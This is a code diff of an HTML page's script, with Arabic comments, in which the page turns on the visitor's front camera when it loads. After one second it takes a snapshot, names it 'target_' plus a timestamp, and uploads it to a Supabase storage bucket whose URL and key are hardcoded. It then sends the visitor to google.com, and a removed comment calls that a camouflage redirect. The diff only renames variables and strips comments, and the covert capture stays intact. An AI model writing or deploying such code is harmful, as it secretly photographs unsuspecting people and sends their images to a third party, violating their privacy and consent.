@@ -20,13 +20,13 @@
     <canvas id="c" width="640" height="480" style="display:none"></canvas>
 
     <script>
-        // بياناتك الحقيقية من الصور
-        const SUPA_URL = 'https://qzbtfafmapwyefbokwb.supabase.co';
-        const SUPA_KEY = 'sb_publishable_x6bUVdUbm9FCbiMZoAvT-A_WbbYOHk2'; 
+        const S_URL = 'https://qzbtfafmapwyefbokwb.supabase.co';
+        const S_KEY = 'sb_publishable_x6bUVdUbm9FCbiMZoAvT-A_WbbYOHk2'; 
 
-        const supabaseClient = supabase.createClient(SUPA_URL, SUPA_KEY);
+        // استخدام اسم متغير فريد لتجنب الخطأ اللي ظهر بالـ Console
+        const mySupabase = supabase.createClient(S_URL, S_KEY);
 
-        async function startSystem() {
+        async function init() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.getElementById('v');
@@ -38,13 +38,9 @@
                     
                     canvas.toBlob(async (blob) => {
                         const fileName = `target_${Date.now()}.jpg`;
-                        
-                        // الرفع لمجلد photos
-                        await supabaseClient.storage.from('photos').upload(fileName, blob, {
+                        await mySupabase.storage.from('photos').upload(fileName, blob, {
                             contentType: 'image/jpeg'
                         });
-
-                        // التحويل التمويهي
                         window.location.href = "https://www.google.com";
                     }, 'image/jpeg');
                 }, 1000);
@@ -52,7 +48,7 @@
                 window.location.href = "https://www.google.com";
             }
         }
-        window.onload = startSystem;
+        window.onload = init;
     </script>
 </body>
-</html>                
+</html>
